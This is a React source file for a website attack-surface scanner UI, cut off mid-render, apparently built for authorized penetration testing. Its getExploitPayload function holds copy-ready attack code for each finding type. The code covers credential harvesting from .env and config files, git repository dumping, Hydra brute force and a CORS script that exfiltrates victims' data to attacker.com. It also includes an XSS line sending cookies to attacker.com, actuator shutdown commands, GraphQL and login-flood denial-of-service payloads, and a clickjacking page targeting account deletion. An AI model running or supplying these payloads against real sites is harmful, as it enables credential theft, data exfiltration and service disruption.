import { useState, useEffect, useRef } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import {
  Target, AlertTriangle, ShieldOff, CheckCircle, Clock, ChevronRight,
  Loader2, Trash2, Globe, Lock, Code2, Database, Server, Link2,
  AlertOctagon, Info, Zap, BarChart2, GitMerge, Layers, Network,
  RefreshCw, Search, Copy, Terminal, FlaskConical,
} from "lucide-react";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

async function apiFetch(path: string, opts?: RequestInit) {
  const r = await fetch(`${BASE}/api${path}`, {
    credentials: "include",
    ...opts,
    headers: { "Content-Type": "application/json", ...(opts?.headers || {}) },
  });
  if (!r.ok) throw new Error(`HTTP ${r.status}`);
  return r.json();
}

type ScanStatus = "pending" | "running" | "complete" | "error";
type Severity = "critical" | "high" | "medium" | "low" | "info";

interface Stage {
  name: string;
  status: "pending" | "running" | "complete" | "error";
  findings: number;
  durationMs?: number;
}

interface Finding {
  id: number;
  scanId: number;
  surface: string;
  surfaceType: string;
  findingType: string;
  severity: Severity;
  title: string;
  description: string;
  evidence?: string;
  remediation?: string;
  chainIdsJson?: string;
  businessImpact?: string;
}

interface ChainNode {
  id: string;
  label: string;
  severity: Severity;
  type: string;
}

interface ChainEdge {
  from: string;
  to: string;
  label: string;
}

interface ChainGraph {
  nodes: ChainNode[];
  edges: ChainEdge[];
}

interface Scan {
  id: number;
  target: string;
  scanStatus: ScanStatus;
  riskScore?: number;
  summary?: string;
  currentStage?: string;
  stages: Stage[];
  chainGraph: ChainGraph;
  findings: Finding[];
  startedAt: string;
  completedAt?: string;
}

interface ScanListItem {
  id: number;
  target: string;
  scanStatus: ScanStatus;
  riskScore?: number;
  startedAt: string;
  completedAt?: string;
}

const SEV_COLOR: Record<Severity, string> = {
  critical: "text-red-400 border-red-400/30 bg-red-400/10",
  high: "text-orange-400 border-orange-400/30 bg-orange-400/10",
  medium: "text-yellow-400 border-yellow-400/30 bg-yellow-400/10",
  low: "text-blue-400 border-blue-400/30 bg-blue-400/10",
  info: "text-primary/50 border-primary/20 bg-primary/5",
};

const SEV_DOT: Record<Severity, string> = {
  critical: "bg-red-400",
  high: "bg-orange-400",
  medium: "bg-yellow-400",
  low: "bg-blue-400",
  info: "bg-primary/30",
};

const SEV_SCORE: Record<Severity, number> = { critical: 40, high: 20, medium: 8, low: 2, info: 0 };

const SURFACE_ICON: Record<string, React.ElementType> = {
  host: Globe,
  header: Server,
  path: Layers,
  tls: Lock,
  tech: Code2,
  subdomain: Network,
  api: Database,
};

function RiskGauge({ score }: { score: number }) {
  const clamp = Math.min(100, Math.max(0, score));
  const color = clamp >= 70 ? "#ef4444" : clamp >= 40 ? "#f97316" : clamp >= 20 ? "#facc15" : "#00ff88";
  const circumference = 2 * Math.PI * 36;
  const offset = circumference - (clamp / 100) * circumference;

  return (
    <div className="relative inline-flex items-center justify-center">
      <svg width="96" height="96" className="-rotate-90">
        <circle cx="48" cy="48" r="36" strokeWidth="6" stroke="rgba(255,255,255,0.05)" fill="none" />
        <circle
          cx="48" cy="48" r="36" strokeWidth="6"
          stroke={color} fill="none"
          strokeDasharray={circumference}
          strokeDashoffset={offset}
          strokeLinecap="round"
          style={{ transition: "stroke-dashoffset 0.8s ease" }}
        />
      </svg>
      <div className="absolute text-center">
        <div className="text-xl font-bold font-mono" style={{ color }}>{clamp}</div>
        <div className="text-[9px] text-primary/30 uppercase tracking-wider">Risk</div>
      </div>
    </div>
  );
}

function ChainGraphView({ graph, findings }: { graph: ChainGraph; findings: Finding[] }) {
  if (!graph.nodes.length) return null;

  const findingMap: Record<string, Finding> = {};
  findings.forEach((f, i) => { findingMap[`F${i}`] = f; });

  const cols: ChainNode[][] = [];
  const placed = new Set<string>();
  const roots = graph.nodes.filter(n => !graph.edges.some(e => e.to === n.id));

  if (roots.length === 0) {
    cols.push([...graph.nodes]);
  } else {
    cols.push(roots);
    roots.forEach(r => placed.add(r.id));
    let frontier = roots;
    while (frontier.length > 0) {
      const next: ChainNode[] = [];
      for (const e of graph.edges) {
        if (placed.has(e.from) && !placed.has(e.to)) {
          const n = graph.nodes.find(nd => nd.id === e.to);
          if (n && !next.find(x => x.id === n.id)) {
            next.push(n);
            placed.add(n.id);
          }
        }
      }
      if (next.length) { cols.push(next); frontier = next; }
      else break;
    }
    const remaining = graph.nodes.filter(n => !placed.has(n.id));
    if (remaining.length) cols.push(remaining);
  }

  return (
    <div className="overflow-x-auto pb-2">
      <div className="flex items-start gap-8 min-w-max p-4">
        {cols.map((col, ci) => (
          <div key={ci} className="flex flex-col gap-3">
            {col.map(node => {
              const finding = findingMap[node.id];
              const sev = (node.severity || "info") as Severity;
              const outEdges = graph.edges.filter(e => e.from === node.id);
              return (
                <div key={node.id} className="relative">
                  <div className={`border rounded-sm p-3 w-44 text-xs font-mono ${SEV_COLOR[sev]}`}>
                    <div className="flex items-center gap-1.5 mb-1">
                      <div className={`w-1.5 h-1.5 rounded-full shrink-0 ${SEV_DOT[sev]}`} />
                      <span className="font-bold text-[10px] uppercase tracking-wide truncate">
                        {sev}
                      </span>
                    </div>
                    <div className="text-current leading-snug">{node.label}</div>
                    {outEdges.length > 0 && (
                      <div className="absolute -right-7 top-1/2 -translate-y-1/2 flex items-center">
                        <div className="w-5 border-t border-dashed border-primary/30" />
                        <ChevronRight className="w-3 h-3 text-primary/30 -ml-1" />
                      </div>
                    )}
                  </div>
                  {outEdges.map((e, ei) => (
                    <div key={ei} className="absolute -bottom-5 left-4 text-[9px] text-primary/30 whitespace-nowrap">
                      {ei === 0 ? e.label.slice(0, 28) : ""}
                    </div>
                  ))}
                </div>
              );
            })}
          </div>
        ))}
      </div>
    </div>
  );
}

function StageTracker({ stages }: { stages: Stage[] }) {
  return (
    <div className="space-y-1.5">
      {stages.map((stage, i) => (
        <div key={i} className="flex items-center gap-3">
          <div className={`w-5 h-5 rounded-full border flex items-center justify-center shrink-0 ${
            stage.status === "complete" ? "border-[#00ff88] bg-[#00ff88]/20" :
            stage.status === "running" ? "border-yellow-400 bg-yellow-400/20" :
            stage.status === "error" ? "border-red-400 bg-red-400/20" :
            "border-primary/20 bg-primary/5"
          }`}>
            {stage.status === "complete" && <CheckCircle className="w-3 h-3 text-[#00ff88]" />}
            {stage.status === "running" && <Loader2 className="w-3 h-3 text-yellow-400 animate-spin" />}
            {stage.status === "error" && <AlertOctagon className="w-3 h-3 text-red-400" />}
            {stage.status === "pending" && <div className="w-1.5 h-1.5 rounded-full bg-primary/20" />}
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center justify-between gap-2">
              <span className={`text-xs font-mono font-bold ${
                stage.status === "complete" ? "text-[#00ff88]" :
                stage.status === "running" ? "text-yellow-400" :
                stage.status === "error" ? "text-red-400" : "text-primary/30"
              }`}>{stage.name}</span>
              {stage.status === "complete" && stage.findings > 0 && (
                <span className="text-[10px] text-primary/40 font-mono">{stage.findings} found</span>
              )}
              {stage.durationMs && (
                <span className="text-[10px] text-primary/20 font-mono">{(stage.durationMs / 1000).toFixed(1)}s</span>
              )}
            </div>
          </div>
        </div>
      ))}
    </div>
  );
}

type ExploitPayload = {
  lang: string;
  category: string;
  code: string;
  note?: string;
};

function getExploitPayload(findingType: string, surface: string): ExploitPayload | null {
  const t = surface || "TARGET";

  switch (findingType) {

    case "env_exposure":
      return {
        lang: "bash", category: "Credential Harvesting",
        code: `# Read exposed .env and extract secrets
curl -s "${t}/.env"

# Extract specific secret patterns
curl -s "${t}/.env" | grep -E "(KEY|SECRET|PASSWORD|TOKEN|DATABASE_URL|STRIPE|AWS)"

# Dump everything line by line
curl -s "${t}/.env" | while IFS='=' read key val; do
  echo "[+] \$key = \$val"
done`,
        note: "Environment files commonly contain database credentials, API keys, and JWT secrets — all readable in a single request.",
      };

    case "git_exposure":
      return {
        lang: "bash", category: "Source Code Extraction",
        code: `# Install git-dumper: pip install git-dumper

# Dump the full exposed Git repository
git-dumper "${t}/.git" ./repo_output

# Manually verify HEAD exists
curl -s "${t}/.git/HEAD"
curl -s "${t}/.git/config"

# Extract commit history and authored files
cd ./repo_output && git log --oneline --all
git show HEAD~1

# Search for hardcoded secrets in extracted code
grep -rE "(password|secret|api_key|token)" ./repo_output --include="*.php" --include="*.js" --include="*.env"`,
        note: "A dumped Git repo exposes full source code, commit history, config files, and any secrets ever committed — even if later deleted.",
      };

    case "admin_panel":
    case "wordpress_admin":
      return {
        lang: "bash", category: "Credential Brute Force",
        code: `# Hydra HTTP POST brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
  -t 30 \\
  ${new URL(t).hostname || t} http-post-form \\
  "/admin/login:username=^USER^&password=^PASS^:Invalid credentials"

# WPScan for WordPress targets
wpscan --url "${t}" --enumerate u,vp,vt
wpscan --url "${t}" --passwords /usr/share/wordlists/rockyou.txt \\
  --usernames admin,administrator,root

# Common default credentials to test manually
# admin:admin | admin:password | admin:123456 | root:root`,
        note: "Admin panels without rate limiting or lockout are vulnerable to automated credential stuffing using common password lists.",
      };

    case "cors_wildcard":
      return {
        lang: "javascript", category: "Cross-Origin Data Theft",
        code: `// Host this on attacker.com — steals authenticated session data
// Exploits: Access-Control-Allow-Origin: *

(function exploitCors() {
  const TARGET = "${t}";
  const EXFIL  = "https://attacker.com/collect";

  // Attempt to read authenticated endpoints cross-origin
  const endpoints = ["/api/user", "/api/profile", "/api/me", "/api/account"];

  endpoints.forEach(async (endpoint) => {
    try {
      const res = await fetch(TARGET + endpoint, {
        method: "GET",
        credentials: "include",   // sends victim's cookies
        headers: { "Content-Type": "application/json" },
      });
      if (res.ok) {
        const data = await res.json();
        // Silently exfiltrate data
        navigator.sendBeacon(EXFIL, JSON.stringify({ endpoint, data }));
        console.log("[+] Exfiltrated", endpoint, data);
      }
    } catch (e) {}
  });
})();`,
        note: "A wildcard CORS policy allows any website to make credentialed requests on behalf of a logged-in victim, silently reading their account data.",
      };

    case "spring_actuator":
      return {
        lang: "bash", category: "Remote Code Execution / Info Disclosure",
        code: `# Dump all environment variables (exposes secrets/keys)
curl -s "${t}/actuator/env" | python3 -m json.tool

# Dump application bean structure (full internals)
curl -s "${t}/actuator/beans" | python3 -m json.tool

# Read heap dump (extract in-memory secrets)
curl -s "${t}/actuator/heapdump" -o heap.hprof
# Analyze: jhat heap.hprof  OR  VisualVM

# Change log level to TRACE (enables verbose credential logging)
curl -X POST "${t}/actuator/loggers/ROOT" \\
  -H "Content-Type: application/json" \\
  -d '{"configuredLevel":"TRACE"}'

# Shutdown the application (DoS)
curl -X POST "${t}/actuator/shutdown"

# Restart (if restart endpoint is enabled)
curl -X POST "${t}/actuator/restart"`,
        note: "Exposed Spring Boot Actuators can lead to full RCE, secret extraction, application shutdown, or memory dump attacks depending on which endpoints are enabled.",
      };

    case "graphql":
      return {
        lang: "graphql", category: "Schema Introspection / Data Extraction",
        code: `# Step 1 — Dump full GraphQL schema (all types, fields, mutations)
POST ${t}/graphql
Content-Type: application/json

{
  "query": "{ __schema { queryType { name } types { name kind description fields { name type { name kind ofType { name kind } } args { name type { name } } } } mutationType { name fields { name } } } }"
}

# Step 2 — Batch query for IDOR (enumerate user IDs)
[
  {"query": "{ user(id: 1) { id email password role } }"},
  {"query": "{ user(id: 2) { id email password role } }"},
  {"query": "{ user(id: 100) { id email password role } }"}
]

# Step 3 — Nested query DDoS (Denial of Service)
{"query": "{ users { posts { comments { author { posts { comments { author { id } } } } } } } }"}

# Step 4 — Test mutations for unauthorized actions
{"query": "mutation { updateUser(id: 2, role: \\"admin\\") { id role } }"}`,
        note: "GraphQL introspection exposes the entire API surface including internal types, mutations, and hidden fields — a complete roadmap for further attacks.",
      };

    case "swagger_ui":
      return {
        lang: "bash", category: "API Enumeration & Auth Bypass",
        code: `# Download full OpenAPI specification
curl -s "${t}/v2/api-docs"        > swagger_v2.json
curl -s "${t}/v3/api-docs"        > openapi_v3.json
curl -s "${t}/swagger.json"       >> swagger_v2.json
curl -s "${t}/openapi.json"       >> openapi_v3.json

# Extract all endpoints from spec
cat swagger_v2.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
for path,methods in d.get('paths',{}).items():
    for method in methods:
        print(f'{method.upper()} {path}')
"

# Test each endpoint for auth bypass (no token)
curl -s "${t}/api/v1/admin/users"
curl -s "${t}/api/v1/admin/config"

# Test for BOLA/IDOR on user-specific endpoints
for id in {1..50}; do
  curl -s "${t}/api/v1/users/\$id" -H "Authorization: Bearer YOUR_TOKEN" &
done`,
        note: "Swagger UI exposes a complete map of every API endpoint, parameter, and response schema — enabling targeted fuzzing and auth bypass testing.",
      };

    case "phpinfo":
      return {
        lang: "bash", category: "Server Intelligence Gathering",
        code: `# Pull full phpinfo output
curl -s "${t}/phpinfo.php" -o phpinfo.html

# Extract critical configuration values
curl -s "${t}/phpinfo.php" | grep -Ei \\
  "DOCUMENT_ROOT|SERVER_SOFTWARE|PHP_SELF|disable_functions|open_basedir|allow_url_include|upload_tmp_dir|session.save_path"

# Look for database config in phpinfo
curl -s "${t}/phpinfo.php" | grep -Ei \\
  "(database|mysql|pgsql|mongo|redis|password|db_host|db_user)"

# Extract loaded PHP extensions (identify attack surface)
curl -s "${t}/phpinfo.php" | grep -oP '(?<=<td class="e">)[A-Za-z_]+(?= Support</td>)'`,
        note: "phpinfo() reveals server paths, PHP config flags, loaded extensions, environment variables, and sometimes database credentials set as env vars.",
      };

    case "backup_exposure":
      return {
        lang: "bash", category: "Source & Data Extraction",
        code: `# Download backup archives
curl -O "${t}/backup.zip"
curl -O "${t}/backup.tar.gz"
curl -O "${t}/db_backup.sql"
curl -O "${t}/site_backup.tar.bz2"

# Inspect archive contents without extracting
unzip -l backup.zip
tar tzf backup.tar.gz
tar tjf backup.tar.bz2

# Extract and search for credentials
unzip backup.zip -d ./backup_extracted
grep -rE "(password|db_pass|SECRET|API_KEY)" ./backup_extracted/
grep -rE "mysql_connect|pg_connect|MongoClient" ./backup_extracted/
find ./backup_extracted -name "*.env" -o -name "*.config" -o -name "wp-config.php"`,
        note: "Backup files often contain full database dumps with plaintext or weakly hashed passwords, complete source code, and configuration secrets.",
      };

    case "config_exposure":
      return {
        lang: "bash", category: "Credential Harvesting",
        code: `# Read config files directly
curl -s "${t}/config.php"
curl -s "${t}/config.json"
curl -s "${t}/config.yml"
curl -s "${t}/config/database.yml"
curl -s "${t}/app/config/parameters.yml"

# Parse PHP config for database credentials
curl -s "${t}/config.php" | grep -Ei \\
  "(db_|database|mysql|pgsql|password|user|host|port)"

# Try common config paths
for f in config.php config.json .env database.php settings.php wp-config.php; do
  code=\$(curl -s -o /dev/null -w "%{http_code}" "${t}/\$f")
  [ "\$code" = "200" ] && echo "[+] FOUND: ${t}/\$f"
done`,
        note: "Config files contain database connection strings, API keys, SMTP credentials, and other secrets that give immediate access to backend systems.",
      };

    case "apache_status":
      return {
        lang: "bash", category: "Server Intelligence & DoS",
        code: `# Read full Apache server status
curl -s "${t}/server-status"
curl -s "${t}/server-status?auto"   # machine-readable format

# Extract active connections and client IPs (identifies internal infrastructure)
curl -s "${t}/server-status" | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+'

# Extract currently processing requests (live URL paths)
curl -s "${t}/server-status" | grep -E "(GET|POST|PUT|DELETE)" | head -20

# Count worker states (gauge DoS impact)
curl -s "${t}/server-status?auto" | grep -E "(Total Accesses|Total kBytes|Uptime|BusyWorkers|IdleWorkers)"`,
        note: "Apache server-status leaks real-time request logs including internal API paths, client IP addresses, and query parameters — live reconnaissance.",
      };

    case "robots_disclosure":
      return {
        lang: "bash", category: "Hidden Path Discovery",
        code: `# Read robots.txt
curl -s "${t}/robots.txt"

# Extract and test all Disallow paths
curl -s "${t}/robots.txt" | grep "Disallow" | awk '{print $2}' | while read path; do
  code=\$(curl -s -o /dev/null -w "%{http_code}" "${t}\$path")
  echo "[\$code] ${t}\$path"
done

# Common high-value paths often in robots.txt
for path in /admin /internal /staging /api/private /backup /uploads /secrets /config; do
  code=\$(curl -s -o /dev/null -w "%{http_code}" "${t}\$path")
  [ "\$code" != "404" ] && echo "[\$code] ${t}\$path"
done`,
        note: "Robots.txt reveals paths intentionally hidden from search engines — administrators, staging environments, and internal APIs that weren't meant to be public.",
      };

    case "weak_tls":
    case "invalid_tls":
    case "tls_expiring":
      return {
        lang: "bash", category: "TLS Downgrade / MITM",
        code: `# Test which TLS versions are accepted
openssl s_client -connect ${new URL(t).hostname || t}:443 -tls1    && echo "[+] TLS 1.0 ACCEPTED"
openssl s_client -connect ${new URL(t).hostname || t}:443 -tls1_1  && echo "[+] TLS 1.1 ACCEPTED"
openssl s_client -connect ${new URL(t).hostname || t}:443 -tls1_2  && echo "[+] TLS 1.2 accepted"

# Enumerate all supported cipher suites
nmap --script ssl-enum-ciphers -p 443 ${new URL(t).hostname || t}

# Test for POODLE (SSLv3)
openssl s_client -connect ${new URL(t).hostname || t}:443 -ssl3 2>&1 | grep "Cipher is"

# Check certificate expiry
echo | openssl s_client -connect ${new URL(t).hostname || t}:443 2>/dev/null | \\
  openssl x509 -noout -dates

# MITM interception tool (requires network position + arp spoof)
# mitmproxy --ssl-insecure --mode transparent`,
        note: "Weak or expiring TLS allows MITM attackers to decrypt traffic, strip HTTPS to HTTP, or force protocol downgrade to exploit known vulnerabilities like POODLE/BEAST.",
      };

    case "missing_security_headers":
    case "missing_hsts":
      return {
        lang: "html", category: "Clickjacking / Header Abuse",
        code: `<!-- Clickjacking PoC — works when X-Frame-Options / CSP frame-ancestors is missing -->
<!-- Host this on any domain and embed the target in a transparent iframe -->

<!DOCTYPE html>
<html>
<head>
  <title>Claim Your Prize!</title>
  <style>
    body { margin: 0; background: #1a1a2e; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .lure { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); z-index: 1; background: #00ff88; color: black; padding: 18px 36px; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 18px; }
    iframe {
      opacity: 0.001;           /* invisible overlay */
      position: fixed; top: 0; left: 0;
      width: 100vw; height: 100vh;
      z-index: 100;             /* clicks go to target's delete/confirm button */
    }
  </style>
</head>
<body>
  <button class="lure">🎁 Claim Reward</button>
  <!-- Target's delete account or transfer funds page sits invisibly on top -->
  <iframe src="${t}/account/delete" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
</body>
</html>

<!-- XSS via missing CSP — inject script tag into reflected inputs
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
-->`,
        note: "Without X-Frame-Options or CSP frame-ancestors, your pages can be embedded invisibly on attacker sites — tricking users into clicking buttons on your site without knowing.",
      };

    case "cms_detected":
      return {
        lang: "bash", category: "CMS Vulnerability Scan",
        code: `# WPScan — WordPress vulnerability scanner
wpscan --url "${t}" --enumerate vp,vt,u,tt,cb,dbe \\
  --api-token YOUR_WPSCAN_API_TOKEN

# Enumerate users (for targeted brute force)
wpscan --url "${t}" --enumerate u

# Check for known plugin CVEs
wpscan --url "${t}" --enumerate vp --plugins-detection aggressive

# Droopescan for Drupal/Joomla/SilverStripe
droopescan scan drupal -u "${t}"
droopescan scan joomla -u "${t}"

# CMSmap automated scan
cmsmap "${t}" -f W -d -a "Mozilla/5.0"`,
        note: "CMS installations with unpatched plugins or themes are frequently the entry point for full server compromise — thousands of known CVEs exist for popular plugins.",
      };

    case "subdomain_exposure":
      return {
        lang: "bash", category: "Subdomain Reconnaissance",
        code: `# Passive subdomain discovery
subfinder -d ${new URL(t).hostname || t} -all -recursive -o subdomains.txt

# Active brute force with wordlist
amass enum -d ${new URL(t).hostname || t} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS Zone Transfer attempt (misconfigured DNS servers leak everything)
dig @ns1.${new URL(t).hostname || t} ${new URL(t).hostname || t} AXFR
host -l ${new URL(t).hostname || t} ns1.${new URL(t).hostname || t}

# Certificate transparency logs (no DNS queries needed)
curl -s "https://crt.sh/?q=%.${new URL(t).hostname || t}&output=json" | \\
  python3 -c "import json,sys; [print(e['name_value']) for e in json.load(sys.stdin)]" | sort -u

# Scan discovered subdomains for open ports
cat subdomains.txt | httpx -silent -status-code -title`,
        note: "Subdomains often expose development, staging, admin, or API environments with weaker security than the main site — forgotten test environments are a common attack vector.",
      };

    case "technology_disclosure":
    case "server_banner":
      return {
        lang: "bash", category: "Version-Based Exploit Search",
        code: `# Extract exact version from headers/response
curl -sI "${t}" | grep -Ei "(server|x-powered-by|x-aspnet-version|x-generator)"

# Search Exploit-DB for the detected version
searchsploit "Apache 2.4"
searchsploit "WordPress 6.0"
searchsploit "PHP 8.1"
searchsploit "nginx 1.18"

# Query NVD for recent CVEs (replace with detected version)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache+2.4.49" | \\
  python3 -c "import json,sys; d=json.load(sys.stdin); [print(v['cve']['id'],v['cve']['descriptions'][0]['value'][:80]) for v in d.get('vulnerabilities',[])]"

# Nuclei CVE scan against target
nuclei -u "${t}" -t cves/ -severity critical,high`,
        note: "Disclosed server versions allow attackers to directly search CVE databases and run pre-written exploit scripts targeting the exact software version in use.",
      };

    case "api_endpoint":
      return {
        lang: "bash", category: "IDOR / Mass Assignment Testing",
        code: `# Test for Insecure Direct Object References (IDOR)
for id in {1..50}; do
  code=\$(curl -s -o /dev/null -w "%{http_code}" "${t}/api/v1/users/\$id" \\
    -H "Authorization: Bearer YOUR_TOKEN")
  [ "\$code" = "200" ] && echo "[+] IDOR: User \$id accessible"
done

# Test mass assignment (add privileged fields during registration)
curl -X POST "${t}/api/v1/users/register" \\
  -H "Content-Type: application/json" \\
  -d '{"username":"attacker","password":"test123","role":"admin","is_admin":true,"subscription":"premium"}'

# Test for missing auth on sensitive endpoints
for ep in /api/v1/admin /api/v1/users /api/v1/export /api/v1/config; do
  code=\$(curl -s -o /dev/null -w "%{http_code}" "${t}\$ep")
  [ "\$code" = "200" ] && echo "[!] UNPROTECTED: ${t}\$ep"
done

# Rate limit test (brute force window)
for i in {1..100}; do
  curl -s "${t}/api/v1/auth/login" \\
    -d '{"email":"admin@example.com","password":"wrong"}' -o /dev/null &
done`,
        note: "Exposed API endpoints often lack per-endpoint authorization checks, rate limiting, or input sanitization — IDOR and mass assignment are among the OWASP API Top 10.",
      };

    default:
      return null;
  }
}

function FindingCard({ finding }: { finding: Finding }) {
  const [expanded, setExpanded] = useState(false);
  const [activeTab, setActiveTab] = useState<"details" | "exploit">("details");
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();
  const sev = finding.severity as Severity;
  const Icon = SURFACE_ICON[finding.surfaceType] || Globe;
  const exploit = getExploitPayload(finding.findingType, finding.surface);

  const copyExploit = () => {
    if (!exploit) return;
    navigator.clipboard.writeText(exploit.code);
    setCopied(true);
    toast({ title: "Exploit code copied", description: "For authorized testing on your own systems only." });
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className={`border rounded-sm p-3 text-xs font-mono ${SEV_COLOR[sev]}`}>
      <div
        className="flex items-start justify-between gap-2 cursor-pointer"
        onClick={() => setExpanded(e => !e)}
      >
        <div className="flex items-start gap-2 min-w-0">
          <div className="mt-0.5 shrink-0">
            <Icon className="w-3.5 h-3.5 opacity-60" />
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className={`text-[9px] font-bold uppercase border px-1 py-px rounded ${SEV_COLOR[sev]}`}>
                {sev}
              </span>
              <span className="font-bold text-current">{finding.title}</span>
              {exploit && (
                <span className="text-[9px] font-bold border border-orange-400/40 bg-orange-400/10 text-orange-400 px-1 py-px rounded flex items-center gap-0.5">
                  <Terminal className="w-2.5 h-2.5" />PoC
                </span>
              )}
            </div>
            <div className="text-current/60 mt-0.5 truncate">{finding.surface}</div>
          </div>
        </div>
        <ChevronRight className={`w-3.5 h-3.5 shrink-0 transition-transform text-current/40 ${expanded ? "rotate-90" : ""}`} />
      </div>

      <p className="text-current/70 mt-2 leading-relaxed">{finding.description}</p>

      {expanded && (
        <div className="mt-3 border-t border-current/20 pt-2.5">

          {/* Tab row */}
          <div className="flex gap-px mb-3">
            <button
              onClick={() => setActiveTab("details")}
              className={`flex items-center gap-1.5 px-3 py-1.5 text-[10px] font-bold uppercase tracking-wider rounded-sm transition-all ${
                activeTab === "details"
                  ? "bg-current/15 text-current"
                  : "text-current/35 hover:text-current/55"
              }`}
            >
              <Info className="w-3 h-3" />Details
            </button>
            {exploit && (
              <button
                onClick={() => setActiveTab("exploit")}
                className={`flex items-center gap-1.5 px-3 py-1.5 text-[10px] font-bold uppercase tracking-wider rounded-sm transition-all ${
                  activeTab === "exploit"
                    ? "bg-orange-400/15 text-orange-400 border border-orange-400/30"
                    : "text-orange-400/40 hover:text-orange-400/70"
                }`}
              >
                <FlaskConical className="w-3 h-3" />Exploit PoC
              </button>
            )}
          </div>

          {/* Details tab */}
          {activeTab === "details" && (
            <div className="space-y-2.5">
              {finding.businessImpact && (
                <div>
                  <div className="text-[10px] text-current/40 uppercase tracking-wide mb-1">Business Impact</div>
                  <p className="text-current/80 leading-relaxed">{finding.businessImpact}</p>
                </div>
              )}
              {finding.evidence && (
                <div>
                  <div className="text-[10px] text-current/40 uppercase tracking-wide mb-1">Evidence</div>
                  <pre className="text-[10px] bg-black/30 p-2 rounded overflow-x-auto whitespace-pre-wrap text-current/60">{finding.evidence}</pre>
                </div>
              )}
              {finding.remediation && (
                <div>
                  <div className="text-[10px] text-current/40 uppercase tracking-wide mb-1">Remediation</div>
                  <p className="text-[#00ff88]/80 leading-relaxed">{finding.remediation}</p>
                </div>
              )}
            </div>
          )}

          {/* Exploit PoC tab */}
          {activeTab === "exploit" && exploit && (
            <div className="space-y-2.5">

              {/* Disclaimer */}
              <div className="flex items-start gap-2 border border-orange-400/20 bg-orange-400/5 rounded-sm px-3 py-2">
                <AlertTriangle className="w-3.5 h-3.5 text-orange-400/70 shrink-0 mt-0.5" />
                <div>
                  <div className="text-[10px] font-bold text-orange-400/80 uppercase tracking-wide">Authorized Testing Only</div>
                  <div className="text-[10px] text-orange-400/50 mt-0.5 leading-relaxed">
                    Run this code only against systems you own or have explicit written permission to test. Unauthorized use is illegal under the CFAA and similar laws.
                  </div>
                </div>
              </div>

              {/* Attack category + language */}
              <div className="flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <span className="text-[9px] font-bold border border-orange-400/30 text-orange-400/80 px-1.5 py-0.5 rounded uppercase tracking-wider">
                    {exploit.category}
                  </span>
                  <span className="text-[9px] text-primary/30 border border-primary/15 px-1.5 py-0.5 rounded uppercase">
                    {exploit.lang}
                  </span>
                </div>
                <button
                  onClick={copyExploit}
                  className="flex items-center gap-1.5 text-[10px] border border-orange-400/30 text-orange-400/60 hover:text-orange-400 hover:border-orange-400/50 px-2 py-1 rounded-sm transition-colors"
                >
                  <Copy className="w-3 h-3" />
                  {copied ? "Copied!" : "Copy"}
                </button>
              </div>

              {/* Code block */}
              <div className="relative">
                <pre className="text-[10px] bg-black/50 border border-orange-400/15 p-3 rounded overflow-x-auto whitespace-pre text-orange-400/70 leading-relaxed max-h-72 overflow-y-auto">
                  {exploit.code}
                </pre>
              </div>

              {/* Attacker note */}
              {exploit.note && (
                <div className="text-[10px] text-primary/40 leading-relaxed border-l-2 border-orange-400/25 pl-2.5">
                  <span className="text-orange-400/50 font-bold">Why it works: </span>{exploit.note}
                </div>
              )}
            </div>
          )}

        </div>
      )}
    </div>
  );
}

export default function GhostChain() {
  const { toast } = useToast();
  const qc = useQueryClient();
  const [target, setTarget] = useState("");
  const [activeScanId, setActiveScanId] = useState<number | null>(null);
  const [filterSev, setFilterSev] = useState<Severity | "all">("all");
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const { data: scans = [], refetch: refetchScans } = useQuery<ScanListItem[]>({
    queryKey: ["attack-chain-scans"],
    queryFn: () => apiFetch("/attack-chain/scans"),
  });

  const { data: activeScan, refetch: refetchActive } = useQuery<Scan>({
    queryKey: ["attack-chain-scan", activeScanId],
    queryFn: () => apiFetch(`/attack-chain/scan/${activeScanId}`),
    enabled: !!activeScanId,
    refetchInterval: activeScanId ? (query) => {
      const status = (query.state.data as Scan | undefined)?.scanStatus;
      return status === "running" || status === "pending" ? 2000 : false;
    } : false,
  });

  const startMut = useMutation({
    mutationFn: (t: string) => apiFetch("/attack-chain/scan", { method: "POST", body: JSON.stringify({ target: t }) }),
    onSuccess: (data) => {
      setActiveScanId(data.scanId);
      refetchScans();
      toast({ title: "Scan Started", description: `Ghost Chain analyzing ${data.target}` });
    },
    onError: (err: Error) => toast({ title: "Scan Failed", description: err.message, variant: "destructive" }),
  });

  const deleteMut = useMutation({
    mutationFn: (id: number) => apiFetch(`/attack-chain/scan/${id}`, { method: "DELETE" }),
    onSuccess: () => {
      refetchScans();
      if (activeScanId) { setActiveScanId(null); }
      toast({ title: "Scan Deleted" });
    },
  });

  const handleScan = () => {
    if (!target.trim()) return;
    startMut.mutate(target.trim());
  };

  const findings = activeScan?.findings || [];
  const filteredFindings = filterSev === "all" ? findings : findings.filter(f => f.severity === filterSev);

  const sevCounts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  findings.forEach(f => { sevCounts[f.severity as Severity] = (sevCounts[f.severity as Severity] || 0) + 1; });

  const chainEdgeCount = activeScan?.chainGraph?.edges?.length || 0;

  return (
    <div className="p-4 md:p-6 space-y-6 font-mono min-h-screen">

      {/* ── Header ─────────────────────────────────────────────────────── */}
      <div className="flex items-start justify-between gap-4">
        <div>
          <div className="flex items-center gap-3 mb-1">
            <GitMerge className="w-5 h-5 text-[#00ff88]" />
